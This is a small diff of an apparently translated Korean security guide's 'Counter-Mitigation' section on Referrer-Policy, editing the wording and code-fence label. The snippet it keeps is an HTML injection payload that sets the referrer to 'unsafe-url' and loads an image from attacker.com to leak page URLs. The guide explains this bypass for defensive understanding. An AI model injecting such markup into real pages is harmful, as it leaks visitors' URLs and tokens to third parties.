@@ -23,8 +23,8 @@ Referrer-Policy: unsafe-url
 ```
 ## Counter-Mitigation
 
-이 규칙은 HTML 메타 태그를 사용하여 무시할 수 있습니다(공격자는 HTML 주입을 이용해야 함):
-```markup
+이 규칙은 HTML 메타 태그를 사용하여 무시할 수 있습니다(공격자는 HTML 주입을 이용해야 합니다):
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
